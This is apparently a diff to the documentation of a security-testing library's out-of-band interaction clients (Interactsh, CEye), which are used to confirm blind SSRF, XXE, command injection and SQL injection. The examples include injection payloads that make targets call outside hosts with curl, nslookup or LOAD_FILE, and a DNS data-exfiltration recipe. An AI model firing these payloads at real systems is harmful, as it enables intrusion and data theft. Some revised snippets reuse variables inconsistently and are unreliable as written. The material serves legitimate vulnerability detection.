@@ -13,14 +13,14 @@ Provides OOB interaction platforms for detecting blind vulnerabilities like SSRF
 Open-source OOB interaction platform.
 
 ```python
-from ofx.api.oob import Interactsh
+from ofx.api.oob import InteractshClient
 
 # Initialize client
-client = Interactsh()
+client = InteractshClient()
 
-# Get unique URL
-url = client.get_url()
-# Returns: "https://cxxxxxxx.interact.sh"
+# Get unique URL + flag
+url, flag = client.build_request(method="https")
+# Example: "https://cxxxxxxx.oast.me"
 
 # Use URL in payload
 payload = f"curl {url}/callback"
@@ -33,52 +33,45 @@ for interaction in interactions:
 ```
 
 **Methods**:
-- `get_url()` - Get unique OOB URL
-- `poll()` - Check for interactions
-- `get_all_interactions()` - Get all interactions
-- `close()` - Cleanup
+- `build_request()` - Generate URL + flag
+- `poll()` - Fetch interactions
+- `verify()` - Verify a specific flag was hit
 
-### Ceye
+### CEye
 
-Ceye.io OOB platform (requires API key).
+CEye.io OOB platform (requires API key).
 
 ```python
-from ofx.api.oob import Ceye
+from ofx.api.oob import CEyeClient
 
 # Initialize with API key
-client = Ceye(api_key="your-api-key")
-
-# Get identifier
-identifier = client.get_identifier()
-domain = f"{identifier}.ceye.io"
+client = CEyeClient(token="your-api-key")
+domain = client.getsubdomain()
 
 # Use in payload
 payload = f"ping -c 1 {domain}"
 
 # Check for DNS queries
-interactions = client.check_dns()
-if interactions:
+payload = client.build_request("test", type="dns")
+if client.verify_request(payload["flag"], type="dns"):
     print("Vulnerable! Received DNS query")
-
-# Check for HTTP requests
-http_logs = client.check_http()
 ```
 
 **Methods**:
-- `get_identifier()` - Get unique identifier
-- `check_dns()` - Check DNS queries
-- `check_http()` - Check HTTP requests  
-- `check_all()` - Check all interaction types
+- `build_request()` - Generate URL + flag
+- `verify_request()` - Check for callback
+- `exact_request()` - Extract exfiltrated data
+- `getsubdomain()` - Account subdomain
 
 ## Use Cases
 
 ### SSRF Detection
 
 ```python
-from ofx.api.oob import Interactsh
+from ofx.api.oob import InteractshClient
 
-client = Interactsh()
-oob_url = client.get_url()
+client = InteractshClient()
+oob_url, flag = client.build_request(method="http")
 
 # Test SSRF
 import requests
@@ -88,18 +81,17 @@ requests.post(
 )
 
 # Check for callback
-interactions = client.poll()
-if interactions:
+if client.verify(flag):
     print("SSRF vulnerability confirmed!")
 ```
 
 ### XXE Detection
 
 ```python
-from ofx.api.oob import Ceye
+from ofx.api.oob import CEyeClient
 
-client = Ceye(api_key="...")
-domain = f"{client.get_identifier()}.ceye.io"
+client = CEyeClient(token="...")
+domain = client.getsubdomain()
 
 # XXE payload
 xxe_payload = f'''<?xml version="1.0"?>
@@ -113,17 +105,18 @@ xxe_payload = f'''<?xml version="1.0"?>
 requests.post("http://target.com/upload", data=xxe_payload)
 
 # Check interactions
-if client.check_http():
+payload = client.build_request("xxe", type="http")
+if client.verify_request(payload["flag"], type="http"):
     print("XXE vulnerability confirmed!")
 ```
 
 ### Command Injection
 
 ```python
-from ofx.api.oob import Interactsh
+from ofx.api.oob import InteractshClient
 
-client = Interactsh()
-oob_url = client.get_url()
+client = InteractshClient()
+oob_url, flag = client.build_request(method="http")
 
 # Command injection payload
 payload = f"; curl {oob_url} ;"
@@ -132,20 +125,19 @@ payload = f"; curl {oob_url} ;"
 requests.get(f"http://target.com/api?cmd={payload}")
 
 # Verify execution
-interactions = client.poll()
-if interactions:
+if client.verify(flag):
     print("Command injection confirmed!")
-    print(f"User-Agent: {interactions[0]['headers']['user-agent']}")
 ```
 
 ### Blind SQL Injection
 
 ```python
-from ofx.api.oob import Ceye
+from ofx.api.oob import CEyeClient
 import time
 
-client = Ceye(api_key="...")
-domain = f"{client.get_identifier()}.ceye.io"
+client = CEyeClient(token="...")
+payload = client.build_request("sqli", type="dns")
+domain = payload["url"]
 
 # DNS exfiltration payload (MySQL)
 payload = f"' OR (SELECT LOAD_FILE('\\\\\\\\{domain}\\\\test')) --"
@@ -156,13 +148,13 @@ requests.get(f"http://target.com/search?q={payload}")
 # Wait for DNS query
 time.sleep(2)
 
-if client.check_dns():
+if client.verify_request(payload["flag"], type="dns"):
     print("Blind SQL injection confirmed!")
 ```
 
 ## Platform Comparison
 
-| Feature | Interactsh | Ceye |
+| Feature | Interactsh | CEye |
 |---------|------------|------|
 | **Open Source** | ✅ Yes | ❌ No |
 | **Self-hosted** | ✅ Yes | ❌ No |
@@ -187,20 +179,20 @@ if client.check_dns():
 ### Custom Interactsh Server
 
 ```python
-from ofx. import Interactsh
+from ofx.api.oob import InteractshClient
 
 # Use custom server
-client = Interactsh(server="https://your-server.com")
-url = client.get_url()
+client = InteractshClient(server="your-server.com")
+url, _ = client.build_request(method="http")
 ```
 
 ### Interaction Filtering
 
 ```python
-from ofx.api.oob import Interactsh
+from ofx.api.oob import InteractshClient
 
-client = Interactsh()
-url = client.get_url()
+client = InteractshClient()
+url, _ = client.build_request(method="http")
 
 # Send payloads...
 
@@ -219,11 +211,11 @@ http_interactions = [
 ### Data Exfiltration
 
 ```python
-from ofx.api.oob import Ceye
+from ofx.api.oob import CEyeClient
 import base64
 
-client = Ceye(api_key="...")
-domain = f"{client.get_identifier()}.ceye.io"
+client = CEyeClient(token="...")
+domain = client.getsubdomain()
 
 # Exfiltrate data via DNS subdomain
 data = "sensitive_data"
@@ -234,11 +226,11 @@ exfil_domain = f"{encoded}.{domain}"
 payload = f"nslookup { exfil_domain}"
 
 # Retrieve data from interactions
-interactions = client.check_dns()
-for interaction in interactions:
-    subdomain = interaction['name'].split('.')[0]
-    exfiltrated = base64.b64decode(subdomain).decode()
-    print(f"Exfiltrated: {exfiltrated}")
+payload = client.build_request(encoded, type="dns")
+if client.verify_request(payload["flag"], type="dns"):
+    exfiltrated = client.exact_request(payload["flag"], type="dns")
+    if exfiltrated:
+        print(f"Exfiltrated: {exfiltrated}")
 ```
 
 ## See Also
